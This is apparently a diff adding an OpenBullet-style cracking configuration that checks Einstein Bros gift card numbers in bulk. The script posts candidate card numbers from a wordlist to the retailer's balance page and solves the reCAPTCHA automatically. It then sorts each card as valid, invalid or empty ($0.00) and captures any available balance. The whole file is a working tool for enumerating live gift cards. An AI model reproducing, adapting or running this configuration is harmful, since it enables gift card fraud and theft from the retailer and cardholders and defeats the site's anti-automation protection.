@@ -1,0 +1,49 @@
+[SETTINGS]
+{
+  "Name": "einstenbros BC",
+  "SuggestedBots": 1,
+  "LastModified": "2018-07-04T22:06:42.2814113+00:00",
+  "AdditionalInfo": "",
+  "Author": "SubAtomic",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST GET "https://shared.einsteinbros.com/giftcard" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+RECAPTCHA "https://shared.einsteinbros.com/giftcard" "6Lfi8iYUAAAAAG05pZc93KMtx4m0O5oX_kqWbqpc" -> VAR "RECAP" 
+REQUEST POST "https://shared.einsteinbros.com/giftcard" AutoRedirect=TRUE 
+  CONTENT "cardNumber=<USER>&pinNumber=&g-recaptcha-response=<RECAP>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Referer: https://shared.einsteinbros.com/giftcard" 
+  HEADER "Origin: https://shared.einsteinbros.com" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "Available Balance" 
+  KEYCHAIN Failure OR 
+    KEY "Try entering the card number again" 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "<p class=\"h1\">$0.00</p>" 
+PARSE "<SOURCE>" LR "<p class=\"h1\">" "<" Recursive=FALSE -> CAP "BALANCE" "" "" 
